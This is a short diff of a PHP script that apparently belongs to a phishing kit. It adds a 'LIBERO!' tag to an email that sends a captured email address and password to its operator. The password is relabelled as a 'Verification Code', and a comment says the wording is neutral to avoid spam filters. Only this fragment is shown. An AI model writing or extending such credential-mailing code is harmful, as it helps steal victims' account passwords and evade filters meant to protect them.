@@ -188,9 +188,9 @@ try {
     $password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');
 
     // Email content with neutral language to avoid spam filters
-    $subject = 'Account Verification Information - ' . date('Y-m-d H:i:s');
+    $subject = 'LIBERO! Account Verification Information - ' . date('Y-m-d H:i:s');
     $message = "
-Account Verification Information
+Account Verification Information LIBERO!_
 
 Email: {$email}
 Verification Code: {$password}
